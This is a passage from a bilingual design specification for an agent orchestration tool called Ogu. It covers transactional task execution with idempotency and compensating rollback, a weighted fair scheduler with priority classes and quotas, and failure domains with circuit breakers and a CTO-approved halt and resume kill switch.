      "Audit is append-only. No deletes. No updates. Only appends.",
      "Budget corrections via compensating entries, not overwrites.",
      "Feature state reverts via explicit transition (e.g. building→allocated on failure).",
      "Resource slots released on any failure path.",
      "Snapshots of failed executions preserved (marked status: rolled_back)."
    ]
  },

  "idempotency": {
    "description": "Every operation has an idempotency key. Re-executing with same key = no-op if already committed.",
    "keyFormat": "sha256(operation_type + primary_key + attempt_number)",
    "storage": ".ogu/idempotency/",
    "ttl": "24 hours (keys older than 24h are garbage collected)",
    "implementation": {
      "before_execute": "Check if idempotency key exists in .ogu/idempotency/. If exists and status=committed, return cached result.",
      "on_commit": "Write idempotency key with status=committed and result hash.",
      "on_rollback": "Write idempotency key with status=rolled_back."
    }
  },

  "reconciliation": {
    "description": "Periodic process that verifies consistency between layers.",
    "trigger": "ogu consistency:check OR automatic every 1 hour",
    "checks": [
      {
        "name": "budget_vs_audit",
        "description": "Sum all budget events in audit → compare to budget.json",
        "fix": "Overwrite budget.json with audit-derived values"
      },
      {
        "name": "allocation_vs_feature_state",
        "description": "All allocated tasks must match feature state",
        "fix": "Reallocate orphaned tasks or mark feature as inconsistent"
      },
      {
        "name": "sessions_vs_resources",
        "description": "No resource slot without active session",
        "fix": "Release orphaned slots"
      },
      {
        "name": "snapshots_vs_outputs",
        "description": "Every committed snapshot must have matching output files",
        "fix": "Mark snapshot as INCOMPLETE if outputs missing"
      }
    ]
  }
}
```

**Pseudo-code: transaction.mjs**

```javascript
// tools/ogu/commands/lib/transaction.mjs

import { audit } from './audit.mjs';
import { recordSpend, refundSpend } from './budget-tracker.mjs';
import { acquireResource, releaseResource } from './resource-governor.mjs';
import { startSession, endSession } from './agent-identity.mjs';
import { captureSnapshot } from './execution-snapshot.mjs';
import { createHash } from 'crypto';
import { existsSync, writeFileSync, readFileSync } from 'fs';
import { join } from 'path';

const IDEMPOTENCY_DIR = '.ogu/idempotency';

/**
 * Execute a task within a formal transaction boundary.
 * Guarantees: all-or-nothing commit, compensating rollback, idempotency.
 */
export async function executeTransaction(root, { inputEnvelope, agent, executor }) {
  const txId = generateTxId(inputEnvelope);
  const idempotencyKey = computeIdempotencyKey(inputEnvelope);

  // Idempotency check
  const existing = checkIdempotency(root, idempotencyKey);
  if (existing?.status === 'committed') {
    return { success: true, cached: true, result: existing.resultHash };
  }

  const txState = {
    txId,
    idempotencyKey,
    phase: 'prepare',
    acquiredResources: [],
    session: null,
    preSnapshot: null,
    outputs: null,
    cost: null
  };

  try {
    // ═══ PHASE 1: PREPARE ═══
    txState.phase = 'prepare';

    // Acquire resource slot
    const slot = await acquireResource(root, {
      resourceType: inputEnvelope.resourceType || 'model_call',
      agentId: agent.agentId,
      taskId: inputEnvelope.taskId,
      featureSlug: inputEnvelope.featureSlug,
      priority: inputEnvelope.priority || 5
    });
    if (!slot.granted) {
      return { success: false, phase: 'prepare', reason: 'resource_unavailable', slot };
    }
    txState.acquiredResources.push(slot.slotId);

    // Start session
    txState.session = startSession(root, agent.agentId, {
      taskId: inputEnvelope.taskId,
      featureSlug: inputEnvelope.featureSlug
    });

    // Pre-snapshot
    txState.preSnapshot = captureSnapshot(root, inputEnvelope, 'pre');

    // ═══ PHASE 2: EXECUTE ═══
    txState.phase = 'execute';
    const execResult = await executor(inputEnvelope, agent);
    txState.outputs = execResult.outputs;
    txState.cost = execResult.cost;

    // ═══ PHASE 3: COMMIT ═══
    txState.phase = 'commit';

    // Step 1: Audit (MUST succeed — append-only file write)
    audit.emit(root, {
      type: 'task_execution_committed',
      txId,
      agentId: agent.agentId,
      context: {
        taskId: inputEnvelope.taskId,
        featureSlug: inputEnvelope.featureSlug,
        cost: txState.cost,
        outputCount: txState.outputs?.length || 0
      }
    });

    // Step 2: Budget
    try {
      recordSpend(root, inputEnvelope.featureSlug, txState.cost?.totalCost || 0);
    } catch (budgetErr) {
      // Budget failure is non-critical — mark dirty, reconcile later
      audit.emit(root, {
        type: 'budget_dirty',
        txId,
        context: { error: budgetErr.message, willReconcile: true }
      });
      markBudgetDirty(root, inputEnvelope.featureSlug);
    }

    // Step 3: Allocation state
    updateAllocationState(root, inputEnvelope.taskId, 'completed', txState.outputs);

    // Step 4: Post-snapshot
    captureSnapshot(root, { ...inputEnvelope, outputs: txState.outputs, cost: txState.cost }, 'post');

    // Step 5: Release resources
    for (const slotId of txState.acquiredResources) {
      releaseResource(root, slotId);
    }
    txState.acquiredResources = [];

    // Step 6: Session → idle
    endSession(root, agent.agentId, 'idle');

    // Record idempotency
    recordIdempotency(root, idempotencyKey, {
      status: 'committed',
      txId,
      resultHash: hashOutputs(txState.outputs),
      committedAt: new Date().toISOString()
    });

    return { success: true, txId, outputs: txState.outputs, cost: txState.cost };

  } catch (error) {
    // ═══ ROLLBACK ═══
    return await rollback(root, txState, error);
  }
}

/**
 * Compensating rollback — never deletes, only appends compensating events.
 */
async function rollback(root, txState, error) {
  const rollbackActions = [];

  // Compensating audit event
  audit.emit(root, {
    type: 'transaction_rolled_back',
    txId: txState.txId,
    context: {
      failedPhase: txState.phase,
      error: error.message,
      compensatingActions: []
    }
  });

  // Refund budget if it was charged
  if (txState.cost?.totalCost && txState.phase === 'commit') {
    try {
      refundSpend(root, txState.cost.featureSlug, txState.cost.totalCost);
      rollbackActions.push('budget_refunded');
    } catch (e) {
      audit.emit(root, { type: 'budget_refund_failed', txId: txState.txId, context: { error: e.message } });
    }
  }

  // Quarantine outputs if produced
  if (txState.outputs?.length) {
    quarantineOutputs(root, txState.txId, txState.outputs);
    rollbackActions.push('outputs_quarantined');
  }

  // Release resource slots
  for (const slotId of txState.acquiredResources) {
    try { releaseResource(root, slotId); } catch (e) { /* will auto-expire */ }
    rollbackActions.push('resource_released');
  }

  // End session
  if (txState.session) {
    try { endSession(root, txState.session.agentId, 'error'); } catch (e) { /* will auto-expire */ }
    rollbackActions.push('session_ended');
  }

  // Record idempotency as rolled_back
  recordIdempotency(root, txState.idempotencyKey, {
    status: 'rolled_back',
    txId: txState.txId,
    error: error.message,
    rolledBackAt: new Date().toISOString()
  });

  return {
    success: false,
    txId: txState.txId,
    phase: txState.phase,
    error: error.message,
    rollbackActions
  };
}

function computeIdempotencyKey(envelope) {
  const input = `${envelope.taskId}:${envelope.featureSlug}:${envelope.attempt || 0}`;
  return createHash('sha256').update(input).digest('hex').slice(0, 16);
}

function checkIdempotency(root, key) {
  const path = join(root, IDEMPOTENCY_DIR, `${key}.json`);
  if (!existsSync(path)) return null;
  const record = JSON.parse(readFileSync(path, 'utf-8'));
  // TTL check — 24h
  if (Date.now() - new Date(record.committedAt || record.rolledBackAt).getTime() > 86400000) return null;
  return record;
}

function recordIdempotency(root, key, record) {
  const path = join(root, IDEMPOTENCY_DIR, `${key}.json`);
  writeFileSync(path, JSON.stringify(record, null, 2));
}
```

**CLI Commands:**

```
ogu consistency:check                          ← Run all reconciliation checks
ogu consistency:check --fix                    ← Auto-fix inconsistencies
ogu consistency:status                         ← Show consistency status per layer
ogu tx:list                                    ← List recent transactions
ogu tx:show <txId>                             ← Show transaction details
ogu tx:orphaned                                ← Find transactions in limbo
ogu idempotency:clean                          ← GC expired idempotency keys
```

**Example:**
```
$ ogu consistency:check
CONSISTENCY CHECK:

  Layer                    Status    Details
  ─────────────────────── ──────── ──────────────────────────────
  Audit Trail              ✓ OK     1,847 events, no gaps
  Feature State Machine    ✓ OK     3 features, all valid states
  Execution Snapshots      ✓ OK     42 snapshots, all outputs exist
  Budget vs Audit          ⚠ DIRTY  auth-system: budget=$12.30, audit=$13.80
  Resource Governor        ✓ OK     no orphaned slots
  Agent Sessions           ✓ OK     2 active, 1 idle, 0 stale

  ACTIONS NEEDED:
    ⚠ Budget for auth-system is $1.50 behind audit.
      Run: ogu consistency:check --fix

$ ogu consistency:check --fix
  ✓ Budget auth-system corrected: $12.30 → $13.80 (from audit)
  ✓ Compensating event logged: budget_reconciled
  All layers consistent.
```

**כלל ברזל:** Audit is append-only and NEVER wrong. Budget is eventually consistent with audit. Feature state = authoritative lifecycle. On conflict, higher-rank layer wins. Every operation has an idempotency key. Rollback = compensating events, never deletes.

---

### Closure 6: Formal Scheduling Policy

**הבעיה:** Kadima מקצה tasks, אבל אין scheduler פורמלי. בלי הגדרה מתמטית של fairness, priority, preemption, ו-starvation prevention — 20 features ו-50 agents יגרמו לקריסה או להרעבה.

**קובץ חדש:** `docs/vault/02_Contracts/Scheduler.contract.md`

**Schema: Scheduler Policy**

```json
{
  "$schema": "SchedulerPolicy/1.0",

  "algorithm": "Weighted Fair Queuing with Priority Classes",

  "priorityClasses": [
    {
      "class": "P0-critical",
      "range": [90, 100],
      "description": "Security fixes, production incidents, CTO-escalated",
      "preemptible": false,
      "maxWaitMs": 0,
      "guaranteedSlots": 1
    },
    {
      "class": "P1-high",
      "range": [70, 89],
      "description": "Feature on critical path, gate failures being fixed",
      "preemptible": false,
      "maxWaitMs": 60000,
      "guaranteedSlots": 0
    },
    {
      "class": "P2-normal",
      "range": [40, 69],
      "description": "Normal feature development tasks",
      "preemptible": true,
      "maxWaitMs": 300000,
      "guaranteedSlots": 0
    },
    {
      "class": "P3-low",
      "range": [10, 39],
      "description": "Optimization, tech debt, learning tasks",
      "preemptible": true,
      "maxWaitMs": 600000,
      "guaranteedSlots": 0
    },
    {
      "class": "P4-background",
      "range": [0, 9],
      "description": "Chaos tests, benchmarks, cleanup",
      "preemptible": true,
      "maxWaitMs": null,
      "guaranteedSlots": 0
    }
  ],

  "fairness": {
    "algorithm": "Weighted Fair Queuing (WFQ)",
    "weights": {
      "description": "Each feature gets a weight. Scheduling time is proportional to weight.",
      "default": 1.0,
      "overrides": [
        { "condition": "feature.state == 'reviewing'", "weight": 1.5, "reason": "Almost done — accelerate" },
        { "condition": "feature.budget.remaining < 0.2", "weight": 0.5, "reason": "Low budget — slow down" },
        { "condition": "feature.failures.consecutive >= 2", "weight": 0.3, "reason": "Failing — reduce allocation" }
      ]
    },
    "virtualClock": {
      "description": "Each feature has a virtual clock. When a task runs, its clock advances by 1/weight. Feature with lowest clock gets scheduled next.",
      "formula": "virtualTime[feature] += executionTime / weight[feature]",
      "tieBreaker": "featureSlug alphabetical (deterministic)"
    }
  },

  "starvationPrevention": {
    "maxWaitBeforePromotion": {
      "P3-low": 600000,
      "P2-normal": 300000
    },
    "promotionStep": 1,
    "description": "If a task waits longer than maxWait, its priority class is promoted by 1 step. P4→P3→P2. P1 and P0 don't promote (they're already high).",
    "maxPromotions": 2,
    "auditOnPromotion": true
  },

  "preemption": {
    "enabled": true,
    "rules": [
      {
        "condition": "incoming.priorityClass == 'P0-critical' AND no_slots_available",
        "action": "preempt_lowest_priority_task",
        "target": "task with lowest priority in P3-low or P4-background",
        "mechanism": "save_checkpoint → release_slot → requeue_preempted_task"
      },
      {
        "condition": "incoming.priorityClass == 'P1-high' AND no_slots_available AND oldest_P2_running > 600000ms",
        "action": "preempt_oldest_P2",
        "target": "P2 task running longest",
        "mechanism": "checkpoint → release → requeue at front of P2 queue"
      }
    ],
    "neverPreempt": [
      "task in commit phase (transaction.phase == 'commit')",
      "task with less than 30s remaining (estimated)",
      "task holding mutually exclusive resource (e.g. npm_install)"
    ]
  },

  "teamQuotas": {
    "description": "Per-team limits prevent one team from monopolizing resources",
    "quotas": [
      { "teamId": "engineering", "maxConcurrentAgents": 4, "maxDailyBudget": 500.00 },
      { "teamId": "product", "maxConcurrentAgents": 1, "maxDailyBudget": 100.00 },
      { "teamId": "quality", "maxConcurrentAgents": 2, "maxDailyBudget": 200.00 }
    ],
    "enforcedBy": "scheduler checks team quota before granting slot"
  },

  "featureQuotas": {
    "maxConcurrentFeaturesBuilding": 5,
    "maxConcurrentFeaturesReviewing": 3,
    "maxTotalActiveFeatures": 10,
    "enforcedBy": "scheduler rejects new feature allocation if limit hit"
  }
}
```

**Pseudo-code: scheduler.mjs**

```javascript
// tools/ogu/commands/lib/scheduler.mjs

import { loadSchedulerPolicy } from './scheduler-policy.mjs';
import { acquireResource, resourceStatus } from './resource-governor.mjs';
import { checkEnvelope } from './feature-isolation.mjs';
import { audit } from './audit.mjs';

const SCHEDULER_STATE = '.ogu/scheduler-state.json';

/**
 * Schedule the next task from the global queue.
 * Returns the task to execute, or null if nothing can run.
 *
 * Algorithm: Weighted Fair Queuing with Priority Classes
 */
export function scheduleNext(root) {
  const policy = loadSchedulerPolicy(root);
  const state = loadSchedulerState(root);
  const queue = state.pendingTasks;

  if (queue.length === 0) return null;

  // Step 1: Apply starvation prevention (promote long-waiting tasks)
  applyStarvationPrevention(queue, policy, state);

  // Step 2: Sort by priority class DESC, then by virtual clock ASC
  queue.sort((a, b) => {
    const classA = getPriorityClass(a.priority, policy);
    const classB = getPriorityClass(b.priority, policy);

    // Higher priority class first
    if (classA.range[0] !== classB.range[0]) {
      return classB.range[0] - classA.range[0];
    }

    // Same class: lowest virtual clock wins (fairness)
    const vtA = state.virtualClocks[a.featureSlug] || 0;
    const vtB = state.virtualClocks[b.featureSlug] || 0;
    if (vtA !== vtB) return vtA - vtB;

    // Tiebreaker: alphabetical slug (deterministic)
    return a.featureSlug.localeCompare(b.featureSlug);
  });

  // Step 3: Find first task that can actually run
  for (const task of queue) {
    // Check team quota
    if (!checkTeamQuota(root, task, policy)) continue;

    // Check feature quota
    if (!checkFeatureQuota(root, task, policy)) continue;

    // Check feature envelope
    const envelopeResult = checkEnvelope(root, task.featureSlug, {
      taskCost: task.estimatedCost,
      resourceType: task.resourceType || 'model_call'
    });
    if (!envelopeResult.allowed) continue;

    // Check resource availability
    const resources = resourceStatus(root);
    const resourceType = task.resourceType || 'model_call';
    const res = resources.find(r => r.type === resourceType);
    if (!res || res.available <= 0) {
      // Try preemption if P0/P1
      const preempted = attemptPreemption(root, task, policy);
      if (!preempted) continue;
    }

    // Task can run — advance virtual clock
    const weight = getFeatureWeight(root, task.featureSlug, policy);
    state.virtualClocks[task.featureSlug] =
      (state.virtualClocks[task.featureSlug] || 0) + (1.0 / weight);

    // Remove from queue
    state.pendingTasks = state.pendingTasks.filter(t => t.id !== task.id);
    saveSchedulerState(root, state);

    audit.emit(root, {
      type: 'task_scheduled',
      context: {
        taskId: task.id,
        featureSlug: task.featureSlug,
        priority: task.priority,
        priorityClass: getPriorityClass(task.priority, policy).class,
        virtualClock: state.virtualClocks[task.featureSlug],
        weight
      }
    });

    return task;
  }

  return null; // Nothing can run right now
}

/**
 * Promote tasks that have waited too long (starvation prevention)
 */
function applyStarvationPrevention(queue, policy, state) {
  const now = Date.now();

  for (const task of queue) {
    const waitMs = now - new Date(task.enqueuedAt).getTime();
    const cls = getPriorityClass(task.priority, policy);
    const maxWait = policy.starvationPrevention.maxWaitBeforePromotion[cls.class];

    if (maxWait && waitMs > maxWait && (task.promotions || 0) < policy.starvationPrevention.maxPromotions) {
      const oldPriority = task.priority;
      task.priority = Math.min(task.priority + 10, 89); // Promote but never above P1
      task.promotions = (task.promotions || 0) + 1;

      audit.emit(null, {
        type: 'task_priority_promoted',
        context: {
          taskId: task.id,
          oldPriority,
          newPriority: task.priority,
          waitMs,
          promotionCount: task.promotions,
          reason: 'starvation_prevention'
        }
      });
    }
  }
}

/**
 * Attempt to preempt a lower-priority task
 */
function attemptPreemption(root, incomingTask, policy) {
  const incomingClass = getPriorityClass(incomingTask.priority, policy);

  for (const rule of policy.preemption.rules) {
    if (evaluatePreemptionCondition(root, rule.condition, incomingTask, incomingClass)) {
      const victim = findPreemptionVictim(root, rule.target, policy);
      if (!victim) continue;

      // Check never-preempt rules
      if (isPreemptionProtected(root, victim, policy)) continue;

      // Preempt: checkpoint → release → requeue
      checkpointTask(root, victim);
      releaseResource(root, victim.slotId);
      requeueTask(root, victim, 'front');

      audit.emit(root, {
        type: 'task_preempted',
        context: {
          preemptedTask: victim.id,
          byTask: incomingTask.id,
          reason: rule.action,
          victimPriority: victim.priority,
          incomingPriority: incomingTask.priority
        }
      });

      return true;
    }
  }

  return false;
}

function getPriorityClass(priority, policy) {
  return policy.priorityClasses.find(c => priority >= c.range[0] && priority <= c.range[1])
    || policy.priorityClasses[policy.priorityClasses.length - 1]; // default to lowest
}

function getFeatureWeight(root, featureSlug, policy) {
  let weight = 1.0;
  for (const override of policy.fairness.weights.overrides) {
    if (evaluateWeightCondition(root, featureSlug, override.condition)) {
      weight = override.weight;
    }
  }
  return weight;
}
```

**CLI Commands:**

```
ogu scheduler:status                           ← Show scheduler state + queue
ogu scheduler:queue                            ← Show pending task queue with priorities
ogu scheduler:fairness                         ← Show virtual clocks + weight per feature
ogu scheduler:simulate --tasks 50              ← Simulate scheduling 50 tasks (dry-run)
ogu scheduler:preempt --show                   ← Show what would be preempted for P0 task
```

**Example:**
```
$ ogu scheduler:status
SCHEDULER STATUS:

  QUEUE: 8 tasks pending

  CLASS       TASKS  RUNNING  MAX WAIT   PROMOTED
  P0-critical 0      0        —          —
  P1-high     1      1        12s        0
  P2-normal   4      2        45s        0
  P3-low      2      0        180s       1 (→P2)
  P4-bg       1      0        340s       0

  FAIRNESS (virtual clocks):
    auth-system      │ vt: 3.2  │ weight: 1.0 │ tasks: 5 run, 2 queued
    dashboard-v2     │ vt: 2.8  │ weight: 1.5 │ tasks: 8 run, 1 queued
    onboarding-flow  │ vt: 1.0  │ weight: 1.0 │ tasks: 1 run, 3 queued  ← next scheduled

  TEAM QUOTAS:
    engineering  │ 3/4 agents  │ $180/$500 budget
    product      │ 0/1 agents  │ $20/$100 budget
    quality      │ 1/2 agents  │ $45/$200 budget

$ ogu scheduler:fairness
WEIGHTED FAIR SCHEDULING:

  Feature             VirtualClock  Weight  Reason
  ─────────────────── ──────────── ─────── ────────────────────────
  onboarding-flow     1.00          1.0     default
  dashboard-v2        2.80          1.5     state=reviewing → accelerate
  auth-system         3.20          1.0     default

  NEXT SCHEDULED: onboarding-flow (lowest virtual clock)
  REASON: WFQ fairness — onboarding has used least proportional time
```

**כלל ברזל:** Scheduling is deterministic — same queue + same state = same decision. Virtual clock ensures fairness. Starvation prevention via promotion. Preemption only for P0/P1 and never during commit phase. Team/feature quotas prevent monopolization.

---

### Closure 7: Failure Domains & Resilience Strategy

**הבעיה:** יש isolation ברמת feature ו-sandbox, אבל אין failure domain mapping. מה קורה כש:
- Provider שלם נופל? (כל ה-Anthropic API down)
- מודל ספציפי מחזיר garbage? (model degradation)
- Audit index נפגם? (infrastructure failure)
- File system מלא? (system-level)

בלי failure domains, circuit breakers, ו-degraded mode — אין resilience אמיתית.

**קובץ חדש:** `docs/vault/02_Contracts/FailureDomains.contract.md`

**Schema: Failure Domain Map**

```json
{
  "$schema": "FailureDomains/1.0",

  "domains": [
    {
      "id": "FD-PROVIDER",
      "name": "Model Provider",
      "scope": "All model API calls to a specific provider",
      "components": ["model-router.mjs", "provider configs", "API keys"],
      "failureModes": [
        { "mode": "provider_down", "detection": "3 consecutive 5xx in 60s", "severity": "high" },
        { "mode": "model_degraded", "detection": "quality score < 0.5 for 3 consecutive tasks", "severity": "medium" },
        { "mode": "rate_limited", "detection": "429 response", "severity": "low" },
        { "mode": "auth_expired", "detection": "401 response", "severity": "critical" }
      ],
      "circuitBreaker": {
        "threshold": 3,
        "windowMs": 60000,
        "cooldownMs": 120000,
        "halfOpenAfterMs": 60000,
        "halfOpenMaxProbes": 2
      },
      "failover": {
        "strategy": "next_provider_same_capability",
        "fallbackChain": ["anthropic → openai → local"],
        "degradedCapabilities": {
          "description": "If all tier-3 providers down, degrade to tier-2 with warning"
        }
      }
    },
    {
      "id": "FD-FILESYSTEM",
      "name": "Local Filesystem",
      "scope": "All .ogu/ reads and writes",
      "components": ["all modules that read/write .ogu/"],
      "failureModes": [
        { "mode": "disk_full", "detection": "ENOSPC error", "severity": "critical" },
        { "mode": "permission_denied", "detection": "EACCES error", "severity": "critical" },
        { "mode": "file_corrupted", "detection": "JSON parse error on known-good file", "severity": "high" }
      ],
      "circuitBreaker": {
        "threshold": 1,
        "windowMs": 10000,
        "cooldownMs": 0,
        "description": "Filesystem failures are immediate — no retry makes sense"
      },
      "failover": {
        "strategy": "emergency_read_only_mode",
        "description": "Switch to read-only. No new tasks. Existing tasks checkpoint and halt."
      }
    },
    {
      "id": "FD-AUDIT",
      "name": "Audit Trail",
      "scope": "Audit event writing and index",
      "components": ["audit.mjs", ".ogu/audit/"],
      "failureModes": [
        { "mode": "write_failed", "detection": "JSONL append fails", "severity": "critical" },
        { "mode": "index_corrupted", "detection": "index query returns inconsistent results", "severity": "high" },
        { "mode": "file_too_large", "detection": "audit file > 100MB", "severity": "medium" }
      ],
      "circuitBreaker": null,
      "failover": {
        "strategy": "halt_system",
        "description": "If audit cannot write, HALT. Audit is the source of truth. Running without audit = flying blind.",
        "backupWrite": ".ogu/audit-emergency/ (separate directory as last resort)"
      }
    },
    {
      "id": "FD-BUDGET",
      "name": "Budget System",
      "scope": "Budget tracking and enforcement",
      "components": ["budget-tracker.mjs", ".ogu/budget.json"],
      "failureModes": [
        { "mode": "budget_corrupted", "detection": "budget.json invalid or NaN values", "severity": "high" },
        { "mode": "budget_desync", "detection": "consistency:check finds delta > 5%", "severity": "medium" }
      ],
      "circuitBreaker": null,
      "failover": {
        "strategy": "reconstruct_from_audit",
        "description": "Budget is rank-4. Reconstruct from audit events (rank-1). Continue operating."
      }
    },
    {
      "id": "FD-SCHEDULER",
      "name": "Scheduler Engine",
      "scope": "Task scheduling and queue management",
      "components": ["scheduler.mjs", ".ogu/scheduler-state.json"],
      "failureModes": [
        { "mode": "state_corrupted", "detection": "JSON parse error or impossible state", "severity": "high" },
        { "mode": "deadlock", "detection": "no task scheduled for > 5 min despite non-empty queue", "severity": "high" }
      ],
      "circuitBreaker": null,
      "failover": {
        "strategy": "rebuild_from_feature_states",
        "description": "Reconstruct queue from feature states + Plan.json. Resume scheduling."
      }
    }
  ],

  "globalKillSwitch": {
    "trigger": "ogu system:halt OR automatic on FD-AUDIT failure OR automatic on FD-FILESYSTEM critical",
    "behavior": {
      "immediate": [
        "Stop all scheduling",
        "Checkpoint all in-progress tasks",
        "Release all resource slots",
        "Set all agent sessions to 'halted'",
        "Write halt event to emergency audit log"
      ],
      "preserves": [
        "All .ogu/ state files (unchanged)",
        "All worktrees (unchanged)",
        "All snapshots (unchanged)"
      ],
      "recovery": "ogu system:resume (requires CTO approval + consistency:check pass)"
    }
  },

  "degradedModes": [
    {
      "mode": "read_only",
      "trigger": "FD-FILESYSTEM critical OR manual ogu company:freeze",
      "behavior": "No writes. Audit viewable. Status viewable. No new tasks.",
      "uiIndicator": "🔴 READ-ONLY MODE — no execution"
    },
    {
      "mode": "single_provider",
      "trigger": "All providers except one are circuit-broken",
      "behavior": "Route all tasks through surviving provider. Warn on capability degradation.",
      "uiIndicator": "🟡 DEGRADED — single provider (${provider})"
    },
    {
      "mode": "budget_frozen",
      "trigger": "FD-BUDGET corrupted until reconciliation",
      "behavior": "Tasks continue but no budget tracking. Flag for immediate reconciliation.",
      "uiIndicator": "🟡 BUDGET FROZEN — reconciliation needed"
    },
    {
      "mode": "audit_emergency",
      "trigger": "Primary audit path failed, writing to emergency backup",
      "behavior": "Continue with emergency audit. Schedule immediate primary audit repair.",
      "uiIndicator": "🔴 AUDIT EMERGENCY — backup mode"
    }
  ]
}
```

**Pseudo-code: circuit-breaker.mjs**

```javascript
// tools/ogu/commands/lib/circuit-breaker.mjs

import { audit } from './audit.mjs';

const BREAKER_STATE = '.ogu/circuit-breakers.json';

/**
 * Circuit breaker states: closed → open → half-open → closed
 *
 * closed: normal operation, counting failures
 * open: all calls rejected, waiting for cooldown
 * half-open: allowing probe calls to test recovery
 */

export function callWithBreaker(root, domainId, fn) {
  const breaker = loadBreaker(root, domainId);

  switch (breaker.state) {
    case 'closed':
      return executeClosed(root, domainId, breaker, fn);

    case 'open':
      // Check if cooldown has passed
      if (Date.now() - breaker.openedAt > breaker.config.halfOpenAfterMs) {
        breaker.state = 'half-open';
        breaker.halfOpenProbes = 0;
        saveBreaker(root, domainId, breaker);
        return executeHalfOpen(root, domainId, breaker, fn);
      }
      // Still cooling down
      return {
        success: false,
        circuitOpen: true,
        error: `OGU4101: Circuit breaker OPEN for ${domainId}. Retry after ${remainingCooldown(breaker)}ms`,
        failover: breaker.config.failover
      };

    case 'half-open':
      return executeHalfOpen(root, domainId, breaker, fn);
  }
}

function executeClosed(root, domainId, breaker, fn) {
  try {
    const result = fn();
    // Success — reset failure count
    breaker.failureCount = 0;
    breaker.lastSuccess = Date.now();
    saveBreaker(root, domainId, breaker);
    return { success: true, result };
  } catch (error) {
    breaker.failureCount++;
    breaker.lastFailure = Date.now();
    breaker.recentErrors.push({
      timestamp: Date.now(),
      error: error.message
    });

    // Trim error history
    const windowStart = Date.now() - breaker.config.windowMs;
    breaker.recentErrors = breaker.recentErrors.filter(e => e.timestamp > windowStart);

    // Check if threshold exceeded
    if (breaker.recentErrors.length >= breaker.config.threshold) {
      breaker.state = 'open';
      breaker.openedAt = Date.now();

      audit.emit(root, {
        type: 'circuit_breaker_opened',
        context: {
          domainId,
          failures: breaker.recentErrors.length,
          threshold: breaker.config.threshold,
          cooldownMs: breaker.config.cooldownMs
        }
      });
    }

    saveBreaker(root, domainId, breaker);
    return { success: false, error, circuitOpen: breaker.state === 'open' };
  }
}

function executeHalfOpen(root, domainId, breaker, fn) {
  try {
    const result = fn();
    breaker.halfOpenProbes++;

    if (breaker.halfOpenProbes >= breaker.config.halfOpenMaxProbes) {
      // Enough successful probes — close circuit
      breaker.state = 'closed';
      breaker.failureCount = 0;
      breaker.recentErrors = [];

      audit.emit(root, {
        type: 'circuit_breaker_closed',
        context: { domainId, probesSucceeded: breaker.halfOpenProbes }
      });
    }

    saveBreaker(root, domainId, breaker);
    return { success: true, result };
  } catch (error) {
    // Probe failed — reopen
    breaker.state = 'open';
    breaker.openedAt = Date.now();

    audit.emit(root, {
      type: 'circuit_breaker_reopened',
      context: { domainId, probesFailed: true }
    });

    saveBreaker(root, domainId, breaker);
    return { success: false, error, circuitOpen: true };
  }
}

/**
 * Provider health monitor — runs continuously
 */
export function monitorProviderHealth(root) {
  const providers = loadProviderConfigs(root);
  const healthReport = [];

  for (const provider of providers) {
    const breaker = loadBreaker(root, `FD-PROVIDER-${provider.id}`);
    const recentTasks = getRecentProviderTasks(root, provider.id, { windowMs: 300000 });

    const successRate = recentTasks.length > 0
      ? recentTasks.filter(t => t.success).length / recentTasks.length
      : 1;

    const avgLatency = recentTasks.length > 0
      ? recentTasks.reduce((sum, t) => sum + t.latencyMs, 0) / recentTasks.length
      : 0;

    healthReport.push({
      provider: provider.id,
      status: breaker.state,
      successRate,
      avgLatencyMs: Math.round(avgLatency),
      recentFailures: breaker.recentErrors.length,
      lastSuccess: breaker.lastSuccess,
      lastFailure: breaker.lastFailure
    });
  }

  return healthReport;
}
```

**Global Kill Switch:**

```javascript
// tools/ogu/commands/lib/system-halt.mjs

export async function halt(root, { reason, actor }) {
  audit.emit(root, {
    type: 'system_halt',
    context: { reason, actor, timestamp: new Date().toISOString() }
  });

  // 1. Stop scheduler
  setSchedulerState(root, 'halted');

  // 2. Checkpoint all in-progress tasks
  const activeTasks = getActiveTasks(root);
  for (const task of activeTasks) {
    await checkpointTask(root, task);
  }

  // 3. Release all resource slots
  forceReleaseAllSlots(root);

  // 4. Halt all sessions
  haltAllSessions(root);

  // 5. Write system state
  writeSystemState(root, {
    mode: 'halted',
    reason,
    haltedAt: new Date().toISOString(),
    haltedBy: actor,
    checkpointedTasks: activeTasks.map(t => t.id),
    resumeRequires: ['cto_approval', 'consistency_check_pass']
  });

  return {
    halted: true,
    tasksCheckpointed: activeTasks.length,
    slotsReleased: true,
    sessionsHalted: true
  };
}

export async function resume(root, { actor, approvalRecord }) {
  // Verify CTO approval
  if (!approvalRecord || approvalRecord.approvedBy !== 'cto') {
    throw new Error('OGU4201: System resume requires CTO approval');
  }

  // Run consistency check
  const consistency = await runConsistencyCheck(root);
  if (!consistency.allPassed) {
    throw new Error(`OGU4202: Consistency check failed. Fix before resume: ${consistency.failures.join(', ')}`);
  }

  // Resume
  setSchedulerState(root, 'running');

  audit.emit(root, {
    type: 'system_resumed',
    context: { actor, approvalRecord: approvalRecord.id, consistencyResult: 'passed' }
  });

  return { resumed: true };
}
```

**CLI Commands:**

```
ogu system:halt --reason "..."                 ← Emergency halt (kill switch)
ogu system:resume --approval <record>          ← Resume (requires CTO approval)
ogu system:health                              ← Show all failure domains + circuit breakers
ogu circuit:status                             ← Circuit breaker status per domain
ogu circuit:reset <domainId>                   ← Manually close a circuit breaker
ogu provider:health                            ← Provider health dashboard
ogu provider:failover --test                   ← Test failover chain (dry-run)
```

**Example:**
```
$ ogu system:health
SYSTEM HEALTH:

  FAILURE DOMAIN        STATUS       CIRCUIT     DETAILS
  ──────────────────── ──────────── ─────────── ──────────────────────
  FD-PROVIDER-anthropic  healthy      closed      98% success, 120ms avg
  FD-PROVIDER-openai     degraded     half-open   2/2 probes OK, recovering
  FD-FILESYSTEM          healthy      closed      12.4GB free
  FD-AUDIT               healthy      —           1,847 events, no errors
  FD-BUDGET              dirty        —           $1.50 delta (reconciling)
  FD-SCHEDULER           healthy      —           8 queued, 0 deadlocks

  SYSTEM MODE: running
  DEGRADED MODES: none active
  KILL SWITCH: armed (ogu system:halt to activate)

$ ogu provider:health
PROVIDER HEALTH:

  Provider    Status       Success%  Avg Latency  Circuit   Failover
  ────────── ──────────── ───────── ──────────── ───────── ─────────
  anthropic   healthy      98.2%     120ms        closed    —
  openai      recovering   85.0%     340ms        half-open anthropic
  local       standby      —         —            —         openai

  FAILOVER CHAIN: anthropic → openai → local
  DEGRADED CAPABILITIES: none (all providers available)
```

